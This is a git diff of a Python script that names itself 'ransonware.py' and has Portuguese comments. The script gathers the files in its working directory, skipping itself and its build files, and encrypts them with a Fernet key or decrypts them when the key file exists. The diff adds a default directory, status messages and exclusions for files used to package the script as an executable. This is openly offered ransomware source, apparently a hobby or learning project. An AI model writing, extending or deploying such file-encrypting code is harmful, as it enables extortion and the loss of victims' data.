@@ -1,30 +1,40 @@
 import os
 from cryptography.fernet import Fernet
-import base64
-import hashlib
 from pathlib import Path
 from getpass import getpass
 
 password = getpass()
 
+pasta = ""
 #pasta = "C:\Temp\BACKUP\Pasta"
 # endereco = "C:\\Users\\rodol\\Dropbox\\Pasta"
 
-os.chdir(pasta)
+if pasta == "":
+    os.chdir(".")
+else:
+    os.chdir(pasta)
 
 keyFile = "thekey.key"
-endereco = pasta + "\\"+keyFile
+
+if pasta == "":
+    endereco = keyFile
+else:
+    endereco = pasta + "\\"+keyFile
 
 crypto = True
 
 key_file = Path(endereco)
 if key_file.exists():
     crypto = False
+    print("Decryptography")
+else:
+    print("Cryptography")
     
+selfName = Path(__file__).name
 
 files = []
 for file in os.listdir():
-    if file == "ransonware.py" or file == "thekey.key" or file == "desktop.ini":
+    if file == "ransonware.py" or file == "thekey.key" or file == "desktop.ini" or file == ".gitignore"  or file == "createexe.sh" or file == "create exe.txt" or file == "pythonScriptName.spec" or file == "ransonware.spec" or file == selfName:
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -61,3 +71,5 @@ if crypto:
     #     thekey.write(key);
 else:
     os.remove(endereco)
+    
+input('Finalizado.')
